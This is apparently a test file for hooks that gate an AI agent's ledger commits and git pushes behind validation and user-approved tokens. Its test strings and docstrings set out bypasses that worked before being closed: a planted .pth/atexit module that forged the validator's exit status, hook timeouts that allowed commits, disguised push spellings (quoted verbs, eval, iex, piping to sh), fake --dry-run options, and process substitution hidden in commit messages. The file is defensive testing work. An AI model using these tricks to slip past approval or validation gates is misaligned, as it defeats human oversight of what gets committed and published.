    assert run_ledger(tmp_path, shell(tmp_path, command)).returncode == 2


def test_the_whole_ledger_is_judged_inside_the_host_hook_budget(tmp_path):
    """The 20s per-file cap MULTIPLIED instead of bounding: 12 ledger files each hitting it is
    241s against a 60s host budget, so the hook was killed before it could exit 2 — and a killed
    hook is a non-blocking error, i.e. the commit proceeded. Two fixes: one index of the sibling
    files instead of re-parsing them per unresolved target (56s → 0.3s for one validate), and a
    TOTAL budget so running out of time is itself a finding."""
    import time as _time
    ledger_project(tmp_path)
    for year in range(2015, 2027):
        rows = [LEDGER_COLS]
        for number in range(1, 301):
            rows.append("L%d-%04d,%d-01-05,%d-01-07,expense,reversal,ACME,R-%d,100.00,19.00,"
                        "119.00,standard,tools,archive/a.pdf,MISSING-%04d,\n"
                        % (year, number, year, year, number, number))
        write(str(tmp_path / "ledger" / ("%d.csv" % year)), "".join(rows))
    started = _time.time()
    result = run_ledger(tmp_path, shell(tmp_path, "git commit -m x"))
    elapsed = _time.time() - started
    assert result.returncode == 2, "it must still refuse"
    module = load_hook_module("gate_ledger_valid", OFFICE_HOOKS)
    assert module.TOTAL_BUDGET < 60, "the cap must fit inside the host's per-hook budget"
    assert elapsed < 55, "%d files took %.1fs — the host kills the hook and the commit goes " \
                         "through" % (12, elapsed)


def test_the_two_ledger_gates_budgets_together_fit_inside_the_hook_deadline():
    """THE SUM IS THE BOUND, because the two gates run SEQUENTIALLY IN ONE PROCESS.

    `settings.json` chains `gate_ledger_valid` and `gate_second_booking` behind one `_gate.py`, so
    what the host sees is one hook whose worst case is BOTH budgets. Each of them was checked
    against `_compat.HOOK_DEADLINE_SECONDS` alone (the test one screen up does it for the first),
    and that is not the property: at 50 + 15 the neighbour's own assertion stays green while the
    chain runs 65 s past a 60 s deadline -- and a killed hook is a silent ALLOW, which is the one
    outcome neither gate can turn into a refusal.

    READ OFF THE MODULES, all three numbers, so the arithmetic lives here and nowhere in a comment:
    `_bookings`' header used to spell "40 + 15 = 55" in prose, which is a copy of a constant that
    belongs to another file. Raising either budget past the sum turns this red.
    """
    ledger = load_hook_module("gate_ledger_valid", OFFICE_HOOKS)
    bookings = load_hook_module("_bookings", OFFICE_HOOKS)
    compat = load_hook_module("_compat", OFFICE_HOOKS)
    together = ledger.TOTAL_BUDGET + bookings.TOTAL_BUDGET
    assert together < compat.HOOK_DEADLINE_SECONDS, (
        "the chained ledger gates give themselves %g s together (%g + %g) against a %g s deadline: "
        "the host kills the chain mid-decision and the commit it was refusing goes through"
        % (together, ledger.TOTAL_BUDGET, bookings.TOTAL_BUDGET, compat.HOOK_DEADLINE_SECONDS))
    # ...and the tooth: a budget of 0 would satisfy the line above while measuring nothing.
    assert bookings.TOTAL_BUDGET > 0 and ledger.TOTAL_BUDGET > 0, (ledger.TOTAL_BUDGET,
                                                                   bookings.TOTAL_BUDGET)


def test_an_ordinary_multi_year_ledger_commit_costs_what_an_empty_one_costs(tmp_path):
    """The honest case paid the quadratic cost too: 7 x 2 000 rows with real cross-year stornos
    cost 17s per commit and 6.5s per append before the sibling index.

    ASSERTED AGAINST A BASELINE, not against a wall-clock number, and the reason is a MEASURED
    property of this gate rather than a preference: one commit through it costs ~2.0 s no matter
    what is in the ledger — interpreter start, the kernel import, the git call — while parsing
    14 000 rows adds ~0.15 s. The signal is 7 % of the measurement, so a threshold in seconds is
    almost entirely a measurement of the machine. That is exactly how the previous `< 10` line
    behaved: measured under a `pytest tools/ -n 8` run it took 10.51 s and failed, on a codebase
    where the same commit takes 2.25 s idle. A baseline divides that constant out, because both
    runs pay it.

    A RATIO of run times is NOT usable here, unlike in the id-scan test one file up: there the
    constant is 240 ms against a defect of 75 s, here the constant IS the measurement. What makes
    this discriminating is the baseline being the SAME gate on the SAME shape with few rows.

    MEASURED (Windows 11, CPython 3.13, medians of 3 runs per point):
      * idle: 500 rows/year 2.10 s, 2000 rows/year 2.25 s -> ratio 1.07, so a bound of 4 sits
        three times above the honest ratio.
      * with the PRE-INDEX SHAPE restored -- `sibling_index`'s cache hit removed AND the
        unresolved-target branch calling `sibling_index(year)` again instead of reading the built
        index, which is the re-parse-per-target that function's own docstring records -- this test
        goes RED, and on the FIRST assertion rather than the ratio: the gate runs out of its own
        whole-ledger budget and REFUSES the honest commit ("a ledger that needs more than 20s is a
        defect in its own right"). That is the strongest form the claim can take, because it is
        the gate itself saying the ordinary case did not fit.
      * removing ONLY the cache changes nothing measurable and the test stays green. Recorded so
        nobody reads this as a pin on that memo: the call site builds the index once per file, and
        the cache is a second-order saving across files.
    """
    def cost(rows_per_year):
        ledger_project(tmp_path)
        for year in range(2020, 2027):
            rows = [LEDGER_COLS] + [
                "L%d-%04d,%d-01-05,%d-01-07,expense,invoice,ACME,R-%d,100.00,19.00,119.00,"
                "standard,tools,archive/a.pdf,,\n" % (year, n, year, year, n)
                for n in range(1, rows_per_year + 1)]
            # REAL CROSS-YEAR STORNOS, and enough of them to matter: each one is a target the
            # validator has to resolve in a SIBLING file, which is the lookup the index exists
            # for. One per year would be resolved by the first build of that index whether it is
            # cached or not — measured: with a single storno, disabling the cache changes nothing
            # at all, so a fixture with one would have been a cost test that cannot see its own
            # defect. They scale with the file so that the baseline stays the same SHAPE.
            for n in range(1, rows_per_year // 10 + 1):
                if year == 2020:
                    break
                rows.append("L%d-9%03d,%d-02-01,%d-02-01,expense,reversal,ACME,R-9%03d,100.00,"
                            "19.00,119.00,standard,tools,archive/a.pdf,L%d-%04d,\n"
                            % (year, n, year, year, n, year - 1, n))
            write(str(tmp_path / "ledger" / ("%d.csv" % year)), "".join(rows))
        taken = []
        for _run in range(3):
            started = time.time()
            result = run_ledger(tmp_path, shell(tmp_path, "git commit -m x"))
            assert result.returncode == 0, result.stderr
            taken.append(time.time() - started)
        return sorted(taken)[1]

    assert cost(2000) < 4 * cost(50)


def test_is_ledger_is_pinned_to_the_canonical_directory():
    """`test_only_the_canonical_ledger_dir_is_judged` asserts that the COMMIT is allowed, which
    depends on the listing rather than on `_is_ledger` — so widening `_is_ledger` back to "any
    nested ledger/ directory" left the suite green. Pinned directly."""
    module = load_hook_module("gate_ledger_valid", OFFICE_HOOKS)
    root = os.path.abspath(os.sep + "proj")
    assert module._is_ledger(os.path.join(root, "ledger", "2026.csv"), root) is not None
    for outside in (os.path.join(root, "archive", "2026", "ledger", "b.csv"),
                    os.path.join(root, "inbox", "ledger", "x.csv"),
                    os.path.join(root, "ledger", "sub", "2026.csv"),
                    os.path.join(root, "ledger.csv")):
        assert module._is_ledger(outside, root) is None, outside


# -- round 5: the venv, the command spellings, ambiguous ids, the real budget --

def test_a_pth_file_in_an_in_repo_venv_cannot_silence_the_validator(tmp_path):
    """`-P -E -s` do not stop `site` from processing `.pth` files, and `.venv/` is writable — the
    shipped `.gitignore` lists it and `requirements-office.txt` invites one. Two Writes were
    enough: a `site-packages/zz_evil.pth` containing `import zz_evil`, and a `zz_evil.py`
    registering an `atexit` hook that calls `os._exit(0)` when `--validate` is in argv. The
    validator then exited 0 WHILE STILL PRINTING its findings, and every commit was allowed.
    `-S` skips site entirely, which is safe because the validator imports stdlib only."""
    ledger_repo(tmp_path, GOOD_ROW + BAD_ROW)
    write(str(tmp_path / "zz_evil.py"),
          "import atexit, os, sys\n"
          "if '--validate' in sys.argv:\n    atexit.register(lambda: os._exit(0))\n")
    site = tmp_path / ".venv" / "Lib" / "site-packages"
    os.makedirs(str(site), exist_ok=True)
    write(str(site / "zz_evil.pth"), "import zz_evil\n")
    assert run_ledger(tmp_path, shell(tmp_path, "git commit -m x")).returncode == 2


def test_findings_on_stderr_count_even_when_the_validator_exits_zero(tmp_path):
    """Belt and braces beside `-S`: the `.pth` bypass forged the exit STATUS while the findings
    were still on stderr, so anything that only silences the status has to silence the output
    too. This is the property the behavioural test above cannot isolate."""
    module = load_hook_module("gate_ledger_valid", OFFICE_HOOKS)
    ledger_project(tmp_path, GOOD_ROW)
    write(str(tmp_path / "scripts" / "ledger_add.py"),
          "import sys\n"
          "sys.stderr.write('[ledger_add] INVALID: net 100.00 != gross 150.00\\n')\n"
          "sys.exit(0)\n")
    findings = module._validate(str(tmp_path), str(tmp_path / "ledger" / "2026.csv"))
    assert findings == ["net 100.00 != gross 150.00"]
    write(str(tmp_path / "scripts" / "ledger_add.py"), "import sys\nsys.exit(0)\n")
    assert module._validate(str(tmp_path), str(tmp_path / "ledger" / "2026.csv")) == []


def test_the_validator_runs_without_site(tmp_path):
    module = load_hook_module("gate_ledger_valid", OFFICE_HOOKS)
    assert "-S" in module._validator_argv("s.py", "l.csv")


@pytest.mark.parametrize("command", [
    "cd ledger && sed -i s/119.00/150.00/ 2026.csv && cd .. && git add -A && git commit -m x",
    "sed -i s/119.00/150.00/ ledger/*.csv && git add -A && git commit -m x",
    "sed -i s/119.00/150.00/ ledger//2026.csv && git commit -m x",
    "git restore ledger/2026.csv && git commit -m 'undo bad edit'",
])
def test_write_and_commit_is_caught_in_every_spelling(tmp_path, command):
    """The path test only recognised `ledger/<4 digits>.csv` literally, so a `cd` into the
    directory, a directory-form star and a doubled slash all walked past it — and the same repo's
    `gate_write_scope` already tracks `cd` carry-over and star forms, so the machinery existed.

    `git restore … && git commit` is in this list deliberately: it IS the targeted shape (a write
    to the ledger followed by a commit in one call), and a restored file can be a previously
    committed broken one. It was the gate's own advertised remedy, which was the real defect —
    every remedy text now says to commit as a SEPARATE call."""
    ledger_repo(tmp_path)                       # CLEAN at the moment of the call
    result = run_ledger(tmp_path, shell(tmp_path, command))
    assert result.returncode == 2, command
    assert "SAME call" in result.stderr


@pytest.mark.parametrize("command", [
    "git commit -m 'restore ledger/2026.csv from backup'",
    "git commit -m 'rm ledger/2026.csv was wrong'",
    "git commit -m 'fix rounding in ledger/2026.csv'",
    "git commit --message='checkout ledger/2026.csv again'",
])
def test_prose_in_a_commit_message_is_not_a_write(tmp_path, command):
    """The conjunction ran against the RAW command, so `restore`/`rm` inside a commit MESSAGE, plus
    the path in the same sentence, produced "this command WRITES a ledger file" for a command that
    writes nothing — with a remedy ("run it as two calls") that cannot be followed when there is
    only one. Which wording tripped it looked arbitrary from the operator's side: 'fix rounding in
    ledger/2026.csv' was fine, 'rm ledger/2026.csv was wrong' was not."""
    ledger_repo(tmp_path)
    assert run_ledger(tmp_path, shell(tmp_path, command)).returncode == 0, command


def test_the_advertised_remedies_are_not_themselves_refused():
    """Every remedy this gate prints must name a command it allows. It advertised `git restore …`
    beside a commit while refusing exactly that combination."""
    body = open(os.path.join(OFFICE_HOOKS, "gate_ledger_valid.py"), encoding="utf-8").read()
    for marker in ("as its OWN call", "as its own call", "split it into two calls"):
        assert marker in body, marker
    assert "run it as two calls — write the ledger first, then commit." not in body


def test_one_id_may_not_live_in_two_ledger_files(tmp_path):
    """The sibling index kept whichever file sorted first and said nothing, so a reversal bound to
    that row. With `L2025-0001` in both 2025.csv (119,00) and 2026.csv (1190,00), a 2027 reversal
    of 119,00 validated clean against the 2025 row — and the direction/gross check CONFIRMED the
    row the operator did not mean — while the 1190,00 booking stayed uncancelled on the books.
    Cross-file resolution is what made an ambiguous id usable; before it, the ambiguity was inert."""
    ledger_project(tmp_path)
    write(str(tmp_path / "ledger" / "2025.csv"), LEDGER_COLS
          + "L2025-0001,2025-01-05,2025-01-07,expense,invoice,ACME,R-1,100.00,19.00,119.00,"
            "standard,tools,archive/a.pdf,,\n")
    write(str(tmp_path / "ledger" / "2026.csv"), LEDGER_COLS
          + "L2025-0001,2026-01-05,2026-01-07,expense,invoice,ACME,R-2,1000.00,19.00,1190.00,"
            "standard,tools,archive/a.pdf,,\n")
    for year in ("2025", "2026"):
        result = validate(tmp_path, "ledger/%s.csv" % year)
        assert result.returncode == 1, year
        assert "also exists in" in result.stderr


def test_a_reversal_cannot_bind_to_an_ambiguous_id(tmp_path):
    """The poisoned index entry, seen from the reversal side."""
    ledger_project(tmp_path)
    for year, gross in (("2025", "119.00"), ("2026", "1190.00")):
        net = "100.00" if gross == "119.00" else "1000.00"
        write(str(tmp_path / "ledger" / (year + ".csv")), LEDGER_COLS
              + "L2025-0001,%s-01-05,%s-01-07,expense,invoice,ACME,R-1,%s,19.00,%s,standard,"
                "tools,archive/a.pdf,,\n" % (year, year, net, gross))
    write(str(tmp_path / "ledger" / "2027.csv"), LEDGER_COLS
          + "L2027-0001,2027-01-05,2027-01-07,expense,reversal,ACME,R-1,100.00,19.00,119.00,"
            "standard,tools,archive/a.pdf,L2025-0001,\n")
    result = validate(tmp_path, "ledger/2027.csv")
    assert result.returncode == 1
    assert "more than one ledger file" in result.stderr


def test_the_budget_bounds_the_hook_below_the_host_timeout(tmp_path):
    """Checking `elapsed > TOTAL_BUDGET` BEFORE starting a file let one begin at 39.9s and run to
    59.9s — the host's own 60s budget, with no margin for interpreter startup; measured at 52.5s
    for five files against a 13s validator. The guaranteed bound needs room for a FULL per-file
    timeout, so a file only starts when `TOTAL_BUDGET - elapsed >= VALIDATE_TIMEOUT`."""
    import time as _time
    module = load_hook_module("gate_ledger_valid", OFFICE_HOOKS)
    ledger_project(tmp_path)
    for year in range(2021, 2027):
        write(str(tmp_path / "ledger" / ("%d.csv" % year)), LEDGER_COLS + GOOD_ROW)
    write(str(tmp_path / "scripts" / "ledger_add.py"), "import time\nwhile True:\n    time.sleep(1)\n")
    started = _time.time()
    result = run_ledger(tmp_path, shell(tmp_path, "git commit -m x"))
    elapsed = _time.time() - started
    assert result.returncode == 2
    assert elapsed <= module.TOTAL_BUDGET + 5, "%.1fs exceeds the whole-ledger budget" % elapsed


def test_unjudged_files_are_reported_as_unjudged_not_as_broken(tmp_path):
    """With two slow files out of six the operator was told all six were broken — four of them as
    "validating it is too slow" for files that were never opened — and the remedy ("correct the
    rows") applied to neither kind. The two real culprits were indistinguishable from the four
    bystanders."""
    ledger_project(tmp_path)
    for year in range(2021, 2027):
        write(str(tmp_path / "ledger" / ("%d.csv" % year)), LEDGER_COLS + GOOD_ROW)
    write(str(tmp_path / "scripts" / "ledger_add.py"), "import time\nwhile True:\n    time.sleep(1)\n")
    result = run_ledger(tmp_path, shell(tmp_path, "git commit -m x"))
    assert result.returncode == 2
    assert "NOT CHECKED" in result.stderr
    assert "may be fine or broken" in result.stderr


def test_running_out_of_budget_is_a_refusal_not_a_pass(tmp_path):
    """The one branch whose regression silently releases the block: replacing the unreached-file
    bookkeeping with a bare `continue` left the whole suite green, because every other budget test
    uses files that fail fast and never enter it."""
    module = load_hook_module("gate_ledger_valid", OFFICE_HOOKS)
    ledger_project(tmp_path)
    for year in range(2021, 2027):
        write(str(tmp_path / "ledger" / ("%d.csv" % year)), LEDGER_COLS + GOOD_ROW)
    write(str(tmp_path / "scripts" / "ledger_add.py"), "import time\nwhile True:\n    time.sleep(1)\n")
    verdicts, unreached = module.judge(str(tmp_path))
    assert unreached, "no file was recorded as unreached, so the budget branch never ran"
    assert verdicts, "the files that WERE tried must still be findings"


def test_a_slow_validator_cannot_push_the_hook_past_its_budget(tmp_path):
    """The HEADROOM, which the other budget tests cannot see.

    They use files that fail fast or hang outright, and for those `elapsed > TOTAL_BUDGET` and
    `elapsed > TOTAL_BUDGET - VALIDATE_TIMEOUT` coincide. The discriminating shape is a validator
    that is SLOW but finishes: five files against a 13s validator took 52.5s with the naive check
    (a file starting at 39.9s ran to 52.9s) and 26.3s with the headroom. 52.5s is inside the
    host's 60s per-hook budget by 7 seconds, with interpreter startup still to pay — and a hook
    the host kills is a non-blocking error, i.e. the commit proceeds.
    """
    import time as _time
    module = load_hook_module("gate_ledger_valid", OFFICE_HOOKS)
    ledger_project(tmp_path)
    for year in range(2022, 2027):
        write(str(tmp_path / "ledger" / ("%d.csv" % year)), LEDGER_COLS + GOOD_ROW)
    slow = ("import sys, time\n"
            "time.sleep(13)\n"
            "sys.stderr.write('[ledger_add] INVALID: slow' + chr(10))\n"
            "sys.exit(1)\n")
    write(str(tmp_path / "scripts" / "ledger_add.py"), slow)
    # the stub has to RUN — a syntax error in it exits instantly and this test then passes in a
    # second while measuring nothing, which is how it first went green
    import subprocess as _sp
    probe = _sp.run([sys.executable, "-c", "compile(open(r'%s').read(), 'x', 'exec')"
                     % str(tmp_path / "scripts" / "ledger_add.py").replace("\\", "\\\\")],
                    capture_output=True, text=True)
    assert probe.returncode == 0, "the slow stub does not parse: %s" % probe.stderr
    started = _time.time()
    verdicts, unreached = module.judge(str(tmp_path))
    elapsed = _time.time() - started
    assert elapsed > 12, "%.1fs — the validator stub did not actually run" % elapsed
    assert elapsed <= module.TOTAL_BUDGET + 2, (
        "%.1fs for 5 slow files — the bound must be TOTAL_BUDGET (%ds), not "
        "TOTAL_BUDGET + VALIDATE_TIMEOUT" % (elapsed, module.TOTAL_BUDGET))
    assert verdicts or unreached, "it must still refuse"


# -- R1: `git push` needs a minted token (parity row 29, MINIMUM-KEEP) --------

PUSH_GATE = os.path.join(TEAM_KITS, "dev-team", "hooks", "gate_push_token.py")


def git_repo(tmp_path):
    """A worktree with one commit, a remote and a kernel state directory."""
    work = tmp_path / "work"
    os.makedirs(str(work), exist_ok=True)
    bare = tmp_path / "remote.git"
    for args in (["init", "-q", "--bare", str(bare)],):
        subprocess.run(["git"] + args, cwd=str(tmp_path), capture_output=True, timeout=60)
    for args in (["init", "-q"], ["config", "user.email", "t@example.com"],
                 ["config", "user.name", "t"], ["remote", "add", "origin", str(bare)]):
        subprocess.run(["git"] + args, cwd=str(work), capture_output=True, timeout=60)
    write(str(work / "a.txt"), "one\n")
    subprocess.run(["git", "add", "-A"], cwd=str(work), capture_output=True, timeout=60)
    subprocess.run(["git", "commit", "-qm", "one"], cwd=str(work), capture_output=True, timeout=60)
    subprocess.run(["git", "branch", "-M", "main"], cwd=str(work), capture_output=True, timeout=60)
    os.makedirs(str(work / "project_memory"), exist_ok=True)
    return work


def git_head(work):
    return subprocess.run(["git", "rev-parse", "HEAD"], cwd=str(work), capture_output=True,
                          text=True, timeout=60).stdout.strip()


def run_push_gate(work, command):
    env = dict(os.environ, CLAUDE_PROJECT_DIR=str(work), HARNESS_KERNEL_PATH=TEAM_KITS)
    payload = {"hook_event_name": "PreToolUse", "tool_name": "Bash", "cwd": str(work),
               "tool_input": {"command": command}}
    return subprocess.run([sys.executable, PUSH_GATE], input=json.dumps(payload),
                          capture_output=True, text=True, env=env, timeout=120)


def approve_push(work, remote, branch, head, ttl=900):
    sys.path.insert(0, TEAM_KITS)
    from kernel import approvals
    from kernel.state import ProjectState
    state = ProjectState(str(work / "project_memory"))
    request = approvals.create_pending_request(
        state, "push", manifest=approvals.push_subject_manifest(remote, branch, head),
        approval_expires=time.time() + ttl)
    question = approvals.build_question(request)
    payload = {"hook_event_name": "PostToolUse", "tool_name": "AskUserQuestion", "cwd": str(work),
               "tool_input": {"questions": [question]},
               "tool_response": {"answers": {
                   question["question"]: approvals.approve_label(request["mint_code"])},
                   "questions": [question]}}
    env = dict(os.environ, CLAUDE_PROJECT_DIR=str(work), HARNESS_KERNEL_PATH=TEAM_KITS)
    result = subprocess.run(
        [sys.executable, os.path.join(TEAM_KITS, "dev-team", "hooks", "gate_approval.py")],
        input=json.dumps(payload), capture_output=True, text=True, env=env, timeout=120)
    assert "recorded for" in result.stderr, result.stderr
    return question


def test_an_unapproved_push_is_refused(tmp_path):
    """"Push nur nach expliziter Userfreigabe" was prose in three constitutions and nothing else,
    so it survived exactly as long as the context window holding it. R1 gives it the same
    two-phase protocol as an APR, with the same mint code."""
    work = git_repo(tmp_path)
    result = run_push_gate(work, "git push origin main")
    assert result.returncode == 2
    assert git_head(work)[:8] in result.stderr, "the message must name what would be published"


def test_the_approval_question_names_what_gets_published(tmp_path):
    """A push approval has no ITEM, so the generic question would ask the user to authorise
    "push" — publishing, without being told what. The manifest is hash-covered, so naming it is
    deterministic (the PreToolUse gate compares the text character for character) and it is the
    entire point of the rule: explicit approval means the user knew what they released."""
    work = git_repo(tmp_path)
    question = approve_push(work, "origin", "main", git_head(work))
    assert "origin/main" in question["question"]
    assert git_head(work)[:8] in question["question"]


def test_the_approved_push_is_allowed_and_nothing_else_is(tmp_path):
    """The counterpart that keeps the gate from being "refuse everything"."""
    work = git_repo(tmp_path)
    approve_push(work, "origin", "main", git_head(work))
    assert run_push_gate(work, "git push origin main").returncode == 0
    assert run_push_gate(work, "git push origin other").returncode == 2
    assert run_push_gate(work, "git push upstream main").returncode == 2


def test_the_token_is_single_use_because_it_is_bound_to_head(tmp_path):
    """Single-use WITHOUT a consumed flag anyone has to keep honest: the next commit moves HEAD,
    so the approval stops matching. A marker file would have been one more piece of writable state
    deciding an enforcement question — the mistake the office ledger gate spent four rounds
    unlearning."""
    work = git_repo(tmp_path)
    approve_push(work, "origin", "main", git_head(work))
    assert run_push_gate(work, "git push origin main").returncode == 0
    write(str(work / "a.txt"), "one\ntwo\n")
    subprocess.run(["git", "add", "-A"], cwd=str(work), capture_output=True, timeout=60)
    subprocess.run(["git", "commit", "-qm", "two"], cwd=str(work), capture_output=True, timeout=60)
    assert run_push_gate(work, "git push origin main").returncode == 2


@pytest.mark.parametrize("command", [
    "git push",                       # no arguments, no upstream configured
    "git push origin main dev",       # two refspecs in one call
    "git push origin HEAD~1:main",    # a refspec that is not this worktree's HEAD
])
def test_a_push_that_cannot_be_pinned_down_is_refused(tmp_path, command):
    """Fail-closed on ambiguity: a guess here authorises publishing something the user did not
    see. Each of these is refused with an instruction to name remote and branch explicitly.

    `git push origin +main` used to stand here as "a force-push in refspec form", and that was the
    gate's whole force rule: one spelling, answered as an ambiguity. It is now judged as a force
    push before the refspec is read at all, so it belongs to the force corpus in `test_hooks.py`
    (`test_a_live_push_token_does_not_cover_a_force_push_in_any_spelling`) and not to this one.
    """
    work = git_repo(tmp_path)
    approve_push(work, "origin", "main", git_head(work))
    result = run_push_gate(work, command)
    assert result.returncode == 2, command
    assert "cannot be pinned" in result.stderr or "no live user approval" in result.stderr


def test_a_revoked_push_token_stops_working(tmp_path):
    """Coverage is read from the consumed REQUEST, which `revoke` MOVES out of the way — so the
    APR file still existing changes nothing."""
    work = git_repo(tmp_path)
    approve_push(work, "origin", "main", git_head(work))
    assert run_push_gate(work, "git push origin main").returncode == 0
    sys.path.insert(0, TEAM_KITS)
    from kernel import approvals
    from kernel.state import ProjectState
    state = ProjectState(str(work / "project_memory"))
    apr_id = sorted(n for n in os.listdir(os.path.join(state.root, "approvals"))
                    if n.startswith("APR-"))[0][:-len(".yaml")]
    approvals.revoke(state, apr_id)
    assert run_push_gate(work, "git push origin main").returncode == 2


def test_an_expired_push_token_stops_working(tmp_path):
    """`push` is in EXPIRING_KINDS for the sharpest of the three reasons: a push token that
    outlives its session is a standing permission to publish."""
    work = git_repo(tmp_path)
    approve_push(work, "origin", "main", git_head(work), ttl=-1)
    assert run_push_gate(work, "git push origin main").returncode == 2


def test_a_hand_written_push_approval_authorises_nothing(tmp_path):
    """The APR file carries only a hash; the manifest lives in the minted request. So a
    hand-written approval has no request behind it and answers no question."""
    work = git_repo(tmp_path)
    approvals_dir = work / "project_memory" / "approvals"
    os.makedirs(str(approvals_dir), exist_ok=True)
    write(str(approvals_dir / "APR-0001.yaml"),
          "id: APR-0001\nkind: push\nrevoked: false\nrequest_id: forged\n"
          "subject_manifest_hash: deadbeef\nexpires: 99999999999\n")
    assert run_push_gate(work, "git push origin main").returncode == 2


def test_a_dry_run_and_non_push_commands_are_not_gated(tmp_path):
    """`--dry-run` publishes nothing, and refusing it would block the safe rehearsal. A merge is
    local, which is why this gate does not reuse `wants_push_or_merge`."""
    work = git_repo(tmp_path)
    for command in ("git status", "git push --dry-run origin main", "git merge feat/x"):
        assert run_push_gate(work, command).returncode == 0, command


@pytest.mark.parametrize("command", [
    'git "push" origin main',
    "git pu''sh origin main",
    "git pu\\\nsh origin main",
    '"git" push origin main',
    'eval "git push origin main"',
    'iex "git push origin main"',
    'Invoke-Expression "git push origin main"',
    'echo "git push origin main" | sh',
    'sudo "git" push origin main',
    "git push>/dev/null origin main",
    'nohup "git" push origin main',
    "git --attr-source HEAD push origin main",
    "git --brand-new HEAD push origin main",
    "git $'push' origin main",
    "V=push; git $V origin main",
    "git pu`sh origin main",
])
def test_a_disguised_push_still_needs_the_token(tmp_path, command):
    """This gate spelled the invocation itself and therefore had the shared bypass twice over.

    `_PUSH_RX` wanted `git`, then git's global options, then the literal word `push`, and it was
    run against the raw text and against the prose-stripped view. Both are blind to a quoted verb:
    in the raw text the quote sits where the pattern wants the verb, and the prose-stripped view
    had already deleted the span the verb was in. So `git "push" origin main` published with no
    approval at all — the MINIMUM-KEEP rule of parity row 29 lifted by two characters. Same for a
    continuation inside the verb, and for `eval`, whose quoted argument is code by definition.

    The rest of the list is the same rule met at every seam the shared reader has since had to
    close, and each of them published without an approval when it was open: a word in front of the
    quoted verb, a global option the reader could not know, ANSI-C quoting, a verb the shell builds
    at run time, the PowerShell escape, a payload handed to a shell through a pipe, PowerShell's own
    eval (`iex`, on a tool this kit gates in its own right), and a redirection, which ends a shell
    word and so cannot stay attached to the verb. R1 is a MINIMUM-KEEP rule, so all of them have to
    answer the same way — nothing is published without the user saying so.
    """
    work = git_repo(tmp_path)
    assert run_push_gate(work, command).returncode == 2, command


def test_a_dry_run_flag_on_another_command_does_not_release_the_push(tmp_path):
    """`--dry-run` is read off THIS push's own arguments, not off the whole line.

    `-n` is an ordinary flag of other git commands (`git commit -n` skips the hooks), so searched
    line-wide the exemption fired on a line whose push was entirely real. It exists for the
    rehearsal that publishes nothing; it must not become a way to spell one that does.
    """
    work = git_repo(tmp_path)
    assert run_push_gate(work, "git commit -n -m wip && git push origin main").returncode == 2


@pytest.mark.parametrize("command", [
    'git push -o "--dry-run" origin main',
    'git push origin main --push-option="x --dry-run y"',
    'git push origin main -o "release -n now"',
    'git push --receive-pack "git-receive-pack --dry-run" origin main',
])
def test_a_push_option_cannot_spell_the_rehearsal_exemption(tmp_path, command):
    """The rehearsal exemption is read as a FLAG, never as text — house rule: check the part that
    runs.

    The round before this one moved the `--dry-run` question off the whole line and onto "this
    push's own arguments", which was the right boundary and the wrong reading: the arguments were
    joined back into a string and searched with a regex. `-o`/`--push-option` sends an ARBITRARY
    string to the server, so the caller writes the exemption into a value and the token gate — the
    only gate enforcing parity row 29, a MINIMUM-KEEP rule — stands down on a push that really
    publishes. All four measured rc 0.

    A token is a token: `--dry-run`/`-n` counts when it IS an argument, and not when it is the
    value of an option that takes one.
    """
    work = git_repo(tmp_path)
    assert run_push_gate(work, command).returncode == 2, command


@pytest.mark.parametrize("command", [
    "git push --dry-run origin main",
    "git push -n origin main",
    "git push origin main --dry-run",
])
def test_the_real_rehearsal_flag_still_releases_the_push(tmp_path, command):
    """THE COUNTER-ASSERTION to the above: `--dry-run` publishes nothing, and a gate that refuses
    the safe rehearsal is a gate people stop rehearsing with. Read as a flag it still is one,
    wherever in the argument list it stands."""
    work = git_repo(tmp_path)
    assert run_push_gate(work, command).returncode == 0, command


@pytest.mark.parametrize("command", [
    "git push origin main >/dev/null",
    "git push origin main >/dev/null 2>&1",
    "git push origin main 2>/dev/null",
])
def test_an_ordinary_redirection_leaves_the_push_pinnable(tmp_path, command):
    """The other direction of the missing metacharacter, and the one that trains people to hide.

    `>/dev/null` and `2>&1` were read as POSITIONAL tokens, so the most ordinary spelling of a push
    arrived here as four refspecs and was refused with "more than one refspec in a single push" —
    an approved push, blocked for its output redirection. Neither the operator, its target nor the
    file descriptor in front of it was ever handed to git.

    Asserted with a LIVE approval, so it can only pass by the tokens being read correctly; the
    partner test below keeps the gate itself honest on the same spellings.
    """
    work = git_repo(tmp_path)
    approve_push(work, "origin", "main", git_head(work))
    assert run_push_gate(work, command).returncode == 0, command


@pytest.mark.parametrize("command", [
    "git push>/dev/null origin main",
    "git push origin main >/dev/null 2>&1",
])
def test_a_redirected_push_without_a_token_is_still_refused(tmp_path, command):
    """...and the same spellings with NO approval, so the test above cannot pass by the gate having
    stopped applying. `git push>/dev/null` is the fail-open half: the verb read as `push>/dev/null`,
    which is no subcommand, and the publication went out unapproved."""
    work = git_repo(tmp_path)
    result = run_push_gate(work, command)
    assert result.returncode == 2, command
    assert "no live user approval" in result.stderr, (command, result.stderr)


def test_the_second_push_on_a_line_needs_its_own_token(tmp_path):
    """A token names one remote, one branch and one commit — so it authorises ONE push.

    The reader stopped at the first `git push` it found, so `git push origin main && git push
    upstream main` was judged on the approved half and published the unapproved one in the same
    call. The counter-assertion is the first line: the approved push alone still goes through, so
    this is not just "everything blocks now".
    """
    work = git_repo(tmp_path)
    approve_push(work, "origin", "main", git_head(work))
    assert run_push_gate(work, "git push origin main").returncode == 0
    result = run_push_gate(work, "git push origin main && git push upstream main")
    assert result.returncode == 2
    assert "upstream/main" in result.stderr


def test_a_project_without_kernel_state_is_not_this_gates_business(tmp_path):
    """A repo with no canonical state has no approval protocol to check against — gating it would
    make the harness unusable in exactly the projects it has not been installed into."""
    work = git_repo(tmp_path)
    shutil.rmtree(str(work / "project_memory"))
    assert run_push_gate(work, "git push origin main").returncode == 0


# -- round 7: what the prose filter and the copy-out exemption opened --------

@pytest.mark.parametrize("command", [
    "git commit -a -m <(sed -i s/119.00/150.00/ ledger/2026.csv)",
    "git commit -m <(cp bad.csv ledger/2026.csv)",
    'git commit -m "${x:=$(sed -i s/1/2/ ledger/2026.csv)}"',
])
def test_an_expanding_message_payload_is_not_prose(tmp_path, command):
    """A `-m` payload is prose only if the shell will not EXECUTE it. `$(…)` and backticks were
    already handled; `<(…)` process substitution was not, and the unquoted branch of the message
    pattern captured only the FIRST token — so the strip removed the write verb and left the path,
    after which nothing looked like a write. Verified end to end before the fix: the `sed` ran and
    the broken row landed in HEAD. Only QUOTED payloads are stripped now, because an unquoted `-m`
    payload cannot be prose with spaces anyway."""
